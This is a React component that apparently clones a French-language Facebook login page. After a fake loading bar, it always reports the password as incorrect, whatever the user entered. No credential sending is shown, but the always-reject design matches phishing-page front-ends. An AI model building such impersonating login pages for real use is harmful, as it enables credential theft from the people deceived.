import React, { Fragment,useState,useEffect } from 'react';
import logo from './logo.svg';
import './App.css';
import Email from './components/Email';
import Password from './components/Password';
import ButtonConnexion from './components/ButtonConnexion';
import CreateAccount from './components/CreateAccount';
import Lang from './components/Lang';
import BlackBackground from './components/BlackBackground';
import TitleFb from './components/TitleFb';

function App() {

  const [openModal, setOpenModal] = useState(false)
  let [widthLoading, setWidthLoading] = useState(0)
  const [shouldCount, setShouldCount] = useState(false)

  const set_animation = ()=>{
    const hide_body = document.querySelector('#hide_body_id')
    const loadEl = document.querySelector('#load')
    hide_body.classList.add('hide_body')
    setShouldCount(true)
    loadEl.classList.add("loading")
  
  }


  useEffect(() => {
    let interval=null
     if(shouldCount){
       interval =  setInterval(() => {
        let numberByRandom = Math.floor(Math.random() * 10)
        setWidthLoading(widthLoading+numberByRandom)
        },500)
      if(widthLoading>97){
        setOpenModal(true)
        clearInterval(interval)
      }
     }
    return ()=>clearInterval(interval)
  }, [shouldCount,widthLoading])

  


  const modalContent = ()=>{
    return openModal ? (<div className="modal_container">
    <div className="modal">
        <p><b>Mot de passe incorect</b></p>
        <p>Le mot de passe que vous avez saisi est incorrect. Veuillez réessayer</p>
        <button onClick={exitModal} className="ok">ok</button>
    </div>
  </div>) : null
  }

  const exitModal = ()=>{
    setOpenModal(false)
    const hide_body = document.querySelector('#hide_body_id')
    const loadEl = document.querySelector('.loading')
    hide_body.classList.remove('hide_body')
    loadEl.classList.remove("loading")
    setWidthLoading(0)
    setShouldCount(false)
  }



  return (
    <Fragment>
      <div className="container">
        <div className="loading"id="load" style={{width: widthLoading+"%"}}></div>
          <TitleFb />
          <div className="main">
            <Email />
            <Password />
            <ButtonConnexion set_animation={set_animation} />
            <p className="forgot">Mot de passe oublié ?</p>
              <CreateAccount />
              <Lang />
          </div>
      </div>

      <BlackBackground />

      {modalContent()}

    </Fragment>
  );
}

export default App;
